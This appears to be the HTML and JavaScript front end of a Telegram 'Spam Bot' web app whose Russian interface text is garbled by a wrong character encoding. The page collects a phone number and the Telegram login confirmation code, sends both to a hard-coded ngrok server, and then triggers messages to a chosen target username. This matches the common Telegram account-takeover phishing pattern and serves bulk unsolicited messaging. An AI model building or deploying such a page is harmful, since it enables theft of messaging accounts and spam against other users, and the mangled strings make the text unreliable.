<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spam Bot</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; padding: 20px; background-color: var(--tg-theme-bg-color, #fff); color: var(--tg-theme-text-color, #000); display: flex; flex-direction: column; align-items: center; }
        .container { width: 100%; max-width: 350px; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 10px; border: 1px solid #ccc; box-sizing: border-box; font-size: 16px; }
        button { width: 100%; padding: 15px; background-color: var(--tg-theme-button-color, #3390ec); color: #fff; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
        .hidden { display: none; }
        #status { margin-top: 15px; text-align: center; font-weight: bold; }
        .error { color: red; } .success { color: green; }
    </style>
</head>
<body>
    <h2>üöÄ –ë–æ—Ç-–†–∞—Å—Å—ã–ª—å—â–∏–∫</h2>
    <div class="container">
        <div id="step1">
            <input type="tel" id="phone" placeholder="+79991234567">
            <button onclick="login()">–ü–æ–ª—É—á–∏—Ç—å –∫–æ–¥</button>
        </div>
        <div id="step2" class="hidden">
            <input type="number" id="code" placeholder="–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è">
            <button onclick="sendCode()">–í–æ–π—Ç–∏</button>
        </div>
        <div id="step3" class="hidden">
            <input type="text" id="target" placeholder="–ù–∏–∫ –¥—Ä—É–≥–∞ (–±–µ–∑ @)">
            <input type="text" id="btnName" placeholder="–¢–µ–∫—Å—Ç –∫–Ω–æ–ø–∫–∏" oninput="updBtn()">
            <button id="mainBtn" onclick="fire()">–ü–æ–ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–æ–≤–∞—Ç—å</button>
        </div>
        <div id="status"></div>
    </div>

    <script>
        // ============================================
        // –¢–í–û–Ø –†–ê–ë–û–ß–ê–Ø –°–°–´–õ–ö–ê NGROK (–£–ñ–ï –í–°–¢–ê–í–õ–ï–ù–ê)
        const SERVER_URL = "https://stiffish-queenie-unbuskined.ngrok-free.dev";
        // ============================================

        const tg = window.Telegram.WebApp;
        tg.expand();

        let myPhone = localStorage.getItem("ph") || "";
        if(myPhone) document.getElementById('phone').value = myPhone;

        function showStatus(text, isErr = false) {
            const el = document.getElementById('status');
            el.innerText = text;
            el.className = isErr ? 'error' : 'success';
        }

        async function req(path, body) {
            try {
                // –î–æ–±–∞–≤–ª—è–µ–º –∑–∞–≥–æ–ª–æ–≤–æ–∫ ngrok-skip, —á—Ç–æ–±—ã –Ω–µ –±—ã–ª–æ –æ—à–∏–±–∫–∏ –±—Ä–∞—É–∑–µ—Ä–∞
                const response = await fetch(SERVER_URL + path, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'ngrok-skip-browser-warning': 'true'
                    },
                    body: JSON.stringify(body)
                });
                return await response.json();
            } catch (e) {
                return {status: 'error', message: '–û—à–∏–±–∫–∞ —Å–µ—Ç–∏. –ü—Ä–æ–≤–µ—Ä—å Python!'};
            }
        }

        async function login() {
            myPhone = document.getElementById('phone').value.replace(/\s/g, '');
            localStorage.setItem("ph", myPhone);
            showStatus("–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ...");
            let res = await req('/login/start', {phone: myPhone});
            if(res.status === 'ok') {
                document.getElementById('step1').classList.add('hidden');
                if(res.step === 'authorized') {
                    document.getElementById('step3').classList.remove('hidden');
                    showStatus("–í—ã —É–∂–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã!");
                } else {
                    document.getElementById('step2').classList.remove('hidden');
                    showStatus("–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!");
                }
            } else showStatus(res.message, true);
        }

        async function sendCode() {
            let code = document.getElementById('code').value.trim();
            showStatus("–ü—Ä–æ–≤–µ—Ä–∫–∞...");
            let res = await req('/login/complete', {phone: myPhone, code: code});
            if(res.status === 'ok') {
                document.getElementById('step2').classList.add('hidden');
                document.getElementById('step3').classList.remove('hidden');
                showStatus("–£—Å–ø–µ—à–Ω–æ!");
            } else showStatus(res.message, true);
        }

        function updBtn() {
            let txt = document.getElementById('btnName').value;
            document.getElementById('mainBtn').innerText = txt ? "–ü–æ–ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–æ–≤–∞—Ç—å " + txt : "–ü–æ–ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–æ–≤–∞—Ç—å";
        }

        async function fire() {
            let target = document.getElementById('target').value.trim();
            showStatus("–û—Ç–ø—Ä–∞–≤–∫–∞...");
            let res = await req('/greet', {phone: myPhone, target: target});
            if(res.status === 'ok') showStatus("–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: " + res.sent);
            else showStatus(res.message, true);
        }
    </script>
</body>
</html>